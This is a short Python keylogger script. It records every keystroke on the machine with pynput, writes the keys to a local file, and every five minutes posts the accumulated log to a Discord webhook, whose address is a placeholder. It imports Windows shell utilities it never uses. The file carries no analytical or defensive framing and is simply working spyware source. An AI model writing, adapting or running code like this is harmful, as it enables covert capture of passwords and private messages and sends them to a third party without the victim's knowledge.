import os
import time
import requests
import shutil
import sys
from pynput import keyboard
import winshell

discord = 'asdasdasdasadasootherpeoplecantgetmydiscrodwebhook'
log_file = "keylog.txt"

def send_to_discord(log_content):
    data = {
        "content": log_content
    }
    requests.post(discord, json=data)

def on_press(key):
    try:
        with open(log_file, "a") as log:
            log.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as log:
            log.write(f"{key}")

with keyboard.Listener(on_press=on_press) as listener:

    while True:
        time.sleep(300)

        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                log_content = f.read()
            send_to_discord(log_content)

listener.join()
